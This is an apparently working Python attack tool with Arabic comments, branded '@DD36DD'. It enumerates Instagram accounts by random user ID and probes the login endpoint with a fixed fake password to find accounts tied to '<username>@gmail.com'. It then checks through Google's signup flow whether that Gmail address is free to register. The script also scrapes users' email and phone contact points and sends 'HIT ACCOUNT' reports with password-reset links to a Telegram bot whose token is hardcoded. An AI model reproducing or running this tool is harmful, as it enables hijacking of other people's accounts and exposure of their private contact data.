import random
import time
import json
import re
import requests
import httpx
import os
from threading import Thread, Lock
from fake_useragent import UserAgent
import colorama
from colorama import Fore, Style
from user_agent import generate_user_agent as gg

colorama.init(autoreset=True)
ua = UserAgent()

# ========== إعدادات التلجرام ==========
BOT_TOKEN = "8832832348:AAET5NMiRlXNMKGTSBP9L64KvCVGQDSXbS0"
print(Fore.CYAN + "Enter chat ID: " + Style.RESET_ALL, end="")
CHAT_ID = input().strip()
if not CHAT_ID:
    print(Fore.RED + "❌ Error: Chat ID is required.")
    exit(1)

def send_to_telegram_text(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload, timeout=5)
    except:
        pass

# ========== دوال جلب المعلومات ==========
def get_instagram_stats(username):
    url = f"https://www.instagram.com/{username}/"
    headers = {'User-Agent': gg()}
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code != 200:
            return None, None, None
        pk_id = None
        pk_patterns = [r'"profilePage_(\d+)"', r'"user_id":"(\d+)"', r'"id":"(\d+)"', r'"pk":(\d+)']
        for pattern in pk_patterns:
            match = re.search(pattern, resp.text)
            if match:
                pk_id = match.group(1)
                break
        pattern = r'<meta\s+property="og:description"\s+content="([^"]+)"'
        match = re.search(pattern, resp.text)
        if not match:
            return None, None, pk_id
        desc = match.group(1)
        parts = desc.split(',')
        followers_str = parts[0].strip() if len(parts) > 0 else ''
        following_str = parts[1].strip() if len(parts) > 1 else ''
        followers_num = re.search(r'([\d.,]+k?)\s*Followers', followers_str, re.IGNORECASE)
        following_num = re.search(r'([\d.,]+k?)\s*Following', following_str, re.IGNORECASE)
        followers = followers_num.group(1) if followers_num else '0'
        following = following_num.group(1) if following_num else '0'
        return followers, following, pk_id
    except Exception:
        return None, None, None

def estimate_creation_date(pk_id):
    try:
        hy = int(pk_id) if pk_id else 0
        ranges = [(1279000, 2010), (17750000, 2011), (279760000, 2012), (900990000, 2013),
                  (1629010000, 2014), (2500000000, 2015), (3713668786, 2016), (5699785217, 2017),
                  (8597939245, 2018), (21254029834, 2019)]
        for upper, year in ranges:
            if hy <= upper:
                return year
        if hy > 21254029834:
            if hy <= 30577684866: return 2020
            elif hy <= 48009087498: return 2021
            elif hy <= 51994527687: return 2022
            else: return 2023
    except:
        return None

# ========== سورس استخراج نقاط الاتصال ==========
def get_contact_points_v2(username):
    try:
        headers = {
            'User-Agent': ua.random,
            'Accept': '*/*',
            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Friendly-Name': 'CAAIGAccountSearchViewQuery',
            'X-IG-App-ID': '936619743392459',
            'X-FB-LSD': 'AdTFt20QDgqWUjoCmCi-evt-f_U',
            'X-ASBD-ID': '359341',
            'Origin': 'https://www.instagram.com',
            'Alt-Used': 'www.instagram.com',
            'Connection': 'keep-alive',
            'Referer': 'https://www.instagram.com/accounts/password/reset/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }
        data = {
            'av': '0',
            '__d': 'www',
            '__user': '0',
            '__a': '1',
            '__req': 'i',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__comet_req': '7',
            'lsd': 'AdTFt20QDgqWUjoCmCi-evt-f_U',
            'jazoest': '22342',
            '__spin_r': '1033505325',
            '__spin_b': 'trunk',
            '__spin_t': '1771181029',
            'server_timestamps': 'true',
            'variables': f'{{"params":{{"search_query":"{username}"}}}}',
            'doc_id': '31115866268061587',
        }
        r = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data, timeout=10)
        t = r.text
        p = r'"contact_points":(\[.*?\])'
        m = re.search(p, t)
        if m:
            j = json.loads(m.group(1))
            results = []
            for i in j:
                if i['type'] in ('EMAIL', 'PHONE'):
                    results.append({'type': i['type'], 'contact_point': i['contact_point']})
            return results
        return []
    except Exception:
        return []

# ========== دالة إرسال الرسالة بالتنسيق الجديد ==========
def send_instagram_info_to_telegram(username, followers, following, pk_id, creation_year, contact_points):
    email = None
    phone = None
    for cp in contact_points:
        if cp['type'] == 'EMAIL':
            email = cp['contact_point']
        elif cp['type'] == 'PHONE':
            phone = cp['contact_point']
    if not email:
        email = f"{username}@gmail.com"
    reset_link = f"https://www.instagram.com/accounts/password/reset/?username={username}"

    followers = followers if followers and followers != 'N/A' else '0'
    following = following if following and following != 'N/A' else '0'
    pk_id = pk_id if pk_id else 'N/A'
    year = creation_year if creation_year else 'Unknown'

    message = f"""𝗛𝗜𝗧 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 
      𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠
        ✦ 𝗕𝗬 ➤ @DD36DD
— — — — — — — — — — — — —
• 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 - @{username}
✦ 𝗘𝗠𝗔𝗜𝗟 ➤ {email}
✦ 𝗥𝗘𝗦𝗘𝗧 ➤ {reset_link}
— — — — — — — — — — — — —
✦ 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 ➤ {followers}
✦ 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 ➤ {following}
✦ 𝗣𝗢𝗦𝗧𝗦 ➤ N/A
— — — — — — — — — — — — —"""
    send_to_telegram_text(message)

# ========== Instagram Extractor & Checker ==========
SPECIAL_PKS = [(5472526329, 2017), (8954893196, 2018), (12281416288, 2019),
               (31949007946, 2020), (49215362966, 2021), (51605812377, 2022)]

def get_pk_range_for_year(year):
    if year == 2022:
        return None, None
    ranges = [(2010, 1, 1279000), (2011, 10000, 18957417), (2012, 18314009, 287924624),
              (2013, 1801651, 461365132), (2014, 361365132, 1682665388), (2015, 1682665388, 3382665388),
              (2016, 2682665388, 8682665388), (2017, 8682665388, 12000000000), (2018, 12000000000, 16000000000),
              (2019, 16000000000, 20000000000), (2020, 20000000000, 24000000000), (2021, 24000000000, 28000000000)]
    for y, low, high in ranges:
        if y == year:
            return low, high
    return None, None

def generate_random_pk_for_year(year):
    if year == 2022:
        pk, _ = random.choice(SPECIAL_PKS)
        return pk
    low, high = get_pk_range_for_year(year)
    if low is None or high is None:
        return None
    return random.randint(low, high)

def extract_username_via_graphql(pk_id):
    try:
        headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
                   'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.instagram.com',
                   'user-agent': ua.random, 'x-csrftoken': 'GXmNMinj7hQfdQoCv1sVETC1JkUGyvDe'}
        data = {'variables': json.dumps({"id": str(pk_id), "location_id": "", "shared_entity_id": "",
                                         "shid": "", "skip_location": True, "skip_sharer": True, "skip_user": False}),
                'doc_id': '23907016675582737'}
        response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data, timeout=8)
        user = response.json()['data']['fetch__XDTUserDict']['username']
        return user
    except Exception:
        return None

def check_instagram_account(email, fixed_password="ajdihwiwbdj"):
    try:
        timestamp = int(time.time())
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{fixed_password}"
        session = requests.Session()
        user_agent = ua.random
        session.get('https://www.instagram.com/', headers={'User-Agent': user_agent})
        csrftoken = session.cookies.get('csrftoken', '')
        login_headers = {'User-Agent': user_agent, 'x-csrftoken': csrftoken, 'x-requested-with': 'XMLHttpRequest',
                         'x-ig-app-id': '936619743392459', 'content-type': 'application/x-www-form-urlencoded',
                         'origin': 'https://www.instagram.com', 'referer': 'https://www.instagram.com/'}
        login_data = {'enc_password': enc_password, 'username': email}
        resp_json = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                                 headers=login_headers, data=login_data).json()
        if resp_json.get('showAccountRecoveryModal') is True:
            return True
        if 'two_factor_required' in resp_json or 'checkpoint_required' in resp_json:
            return True
        return False
    except:
        return False

# ========== Google Availability Checker ==========
def get_google_tokens():
    try:
        chars = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(chars) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(chars) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(chars) for _ in range(random.randrange(15, 30)))
        headers = {"google-accounts-xsrf": "1", "user-agent": ua.random}
        res = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&hl=en-GB', headers=headers, timeout=10)
        tok_search = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res.text)
        if not tok_search:
            return None, None
        tok = tok_search.group(2)
        validate_data = {'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                         'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
        response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',
                                 cookies={'__Host-GAPS': host}, headers=headers, data=validate_data, timeout=10)
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        new_host = response.cookies.get_dict().get('__Host-GAPS', host)
        return tl, new_host
    except:
        return None, None

def google_check(username):
    if "@" in username:
        username = username.split("@")[0]
    tl, host = get_google_tokens()
    if not tl:
        return "Error"
    try:
        headers = {'authority': 'accounts.google.com', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                   'google-accounts-xsrf': '1', 'user-agent': ua.random}
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        response = requests.post(f'https://accounts.google.com/_/signup/usernameavailability?TL={tl}',
                                 cookies={'__Host-GAPS': host}, headers=headers, data=data, timeout=10)
        if '"gf.uar",1' in response.text:
            return "Good"
        else:
            return "Bad"
    except:
        return "Error"

# ========== إحصائيات ولوحة الفحص ==========
stats_lock = Lock()
stats = {"total": 0, "good": 0, "bad": 0, "not_f": 0, "error": 0}
year_stats = {year: 0 for year in range(2010, 2022)}  # 2010-2021

def update_stats(category, year=None):
    with stats_lock:
        stats["total"] += 1
        if category == "good":
            stats["good"] += 1
            if year and year in year_stats:
                year_stats[year] += 1
        elif category == "bad":
            stats["bad"] += 1
        elif category == "insta_fail":
            stats["not_f"] += 1
        elif category == "google_error":
            stats["error"] += 1

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_dashboard():
    with stats_lock:
        total = stats["total"]
        good = stats["good"]
        bad = stats["bad"]
        not_f = stats["not_f"]
        error = stats["error"]
        ys = year_stats.copy()
    
    print(Fore.LIGHTBLUE_EX + " ╭─── @DD36DD ─── ViP ─── 2026 ───╮")
    print(Fore.LIGHTBLUE_EX + " │                                │")
    print(Fore.LIGHTBLUE_EX + f" │   Total  »  {str(total).ljust(20)}│")
    print(Fore.LIGHTGREEN_EX + f" │   Good   »  {str(good).ljust(20)}│")
    print(Fore.LIGHTYELLOW_EX + f" │   Bad    »  {str(bad).ljust(20)}│")
    print(Fore.LIGHTRED_EX + f" │   Not F  »  {str(not_f).ljust(20)}│")
    print(Fore.LIGHTMAGENTA_EX + f" │   Error  »  {str(error).ljust(20)}│")
    print(Fore.LIGHTBLUE_EX + " │                                │")
    print(Fore.LIGHTBLUE_EX + " ╰────────────────────────────────╯")
    
    print(Fore.CYAN + " ┌─── [ YEARS STATISTICS ] ───────┐")
    years = sorted(ys.keys())
    half = len(years) // 2
    left = years[:half]
    right = years[half:]
    line1 = " │"
    for y in left:
        line1 += f"  {y} » {str(ys[y]).ljust(4)} │"
    print(Fore.CYAN + line1)
    line2 = " │"
    for y in right:
        line2 += f"  {y} » {str(ys[y]).ljust(4)} │"
    print(Fore.CYAN + line2)
    print(Fore.CYAN + " └────────────────────────────────┘" + Style.RESET_ALL)

# ========== العامل الرئيسي ==========
THREADS = 12

def worker(years_list):
    while True:
        try:
            year = random.choice(years_list)
            pk_id = generate_random_pk_for_year(year)
            if not pk_id:
                continue
            username = extract_username_via_graphql(pk_id)
            if username and '_' not in username and len(username) >= 7:
                email = f"{username}@gmail.com"
                if not check_instagram_account(email):
                    update_stats("insta_fail")          # no year
                    continue
                gmail_status = google_check(email)
                if gmail_status == "Good":
                    contact_points = get_contact_points_v2(username)
                    followers, following, pk_id_fetched = get_instagram_stats(username)
                    if pk_id_fetched is None:
                        pk_id_fetched = pk_id
                    creation_year = estimate_creation_date(pk_id_fetched)
                    send_instagram_info_to_telegram(username, followers, following, pk_id_fetched, creation_year, contact_points)
                    update_stats("good", year)          # year passed
                elif gmail_status == "Bad":
                    update_stats("bad")                 # no year
                else:
                    update_stats("google_error")        # no year
        except Exception:
            pass
        time.sleep(0.3)

def main():
    clear_screen()
    print(Fore.CYAN + "Instagram + Gmail Checker - Starting...\n")
    time.sleep(1)
    print_dashboard()
    
    years_list = [2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019, 2020, 2021, 2022]
    threads = []
    for _ in range(THREADS):
        t = Thread(target=worker, args=(years_list,), daemon=True)
        t.start()
        threads.append(t)
    
    try:
        while True:
            time.sleep(1)
            clear_screen()
            print_dashboard()
    except KeyboardInterrupt:
        clear_screen()
        print(Fore.YELLOW + "\nBot stopped by user.")
        send_to_telegram_text("⏹️ Bot stopped by user.")

if __name__ == "__main__":
    main()
